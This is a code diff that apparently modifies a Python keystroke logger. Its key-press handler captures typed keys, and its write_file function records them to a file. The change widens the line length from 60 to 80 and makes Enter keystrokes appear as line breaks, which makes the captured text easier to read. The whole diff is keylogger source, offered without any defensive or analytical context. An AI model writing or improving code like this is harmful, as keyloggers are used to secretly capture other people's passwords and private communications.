@@ -22,7 +22,7 @@ def on_press(key):
     line_count += 1
     if key_count >= 10:
         write_file(keys, line_count)
-        if line_count >= 60:
+        if line_count >= 80:
             line_count = 0
         key_count = 0
         keys = []
@@ -55,12 +55,14 @@ def write_file(keys, line_count):
         letter = "w"
     #writing keys to file
     with open(file_name, letter) as file:
-        if line_count >= 60:
+        if line_count >= 80:
             file.write("\n")
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
                 file.write(" ")
+            elif k.find("enter") > 0:
+                file.write("\n")
             elif k.find("Key") == -1:
                 file.write(k)
 
